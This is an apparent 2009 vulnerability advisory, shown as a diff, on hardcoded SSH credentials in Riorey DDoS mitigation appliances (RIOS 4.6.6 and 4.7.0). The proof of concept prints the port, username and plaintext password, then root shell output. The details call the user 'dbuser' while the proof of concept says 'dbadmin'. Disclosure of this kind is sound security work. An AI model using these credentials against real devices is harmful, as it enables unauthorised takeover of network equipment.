@@ -1,0 +1,41 @@
+Severity: High (Full root access to the device)
+Date: 07 October 2009 
+Versions Affected: RIOS 4.6.6 , 4.7.0 possibly others
+Discovered on: 25 July 2009
+Vendor URL: www.riorey.com
+Author: Marek Kroemeke
+
+Overview:
+
+Riorey DDoS mitigation appliences (www.riorey.com) are vulnerable to taking a full control
+over affected devices via a hardcoded username and password used to create
+a SSH tunnel between the RView application and the device itself. 
+
+
+Details:
+
+Riorey devices running affected "RIOS" versions have a hardcoded username and password
+that is then used by the RView software to connect on port 8022 in order to create
+a SSH tunnel. This allows the attacker to login as user 'dbuser' using
+the hardcoded password, and due to an old Linux kernel version used - escalate privilages
+through several vulnerabilities and eventually take the full control over the device.
+
+Additionally - the web interface advices the user to reset the admin password for security reasons,
+but the RView application still uses the hardcoded password in order to create the SSH tunnel which
+may result in a false sense of security.
+
+Proof of Concept:
+
+Open your favorite SSH client and use the following detials in order to login:
+
+port: 8022
+username: dbadmin
+password: sq!us3r
+
+-- cut --
+root () rioreyXXXXXXX dbuser # id
+uid=0(root) gid=0(root) groups=0(root)
+root () rioreyXXXXXXX dbuser # uname -a
+Linux rioreyXXXXXXX 2.6.16.6 #23 SMP Fri Oct 24 19:29:08 EDT 2008 x86_64
+Dual-Core AMD Opteron(tm) Processor 1210 HE AuthenticAMD GNU/Linux
+-- cut --
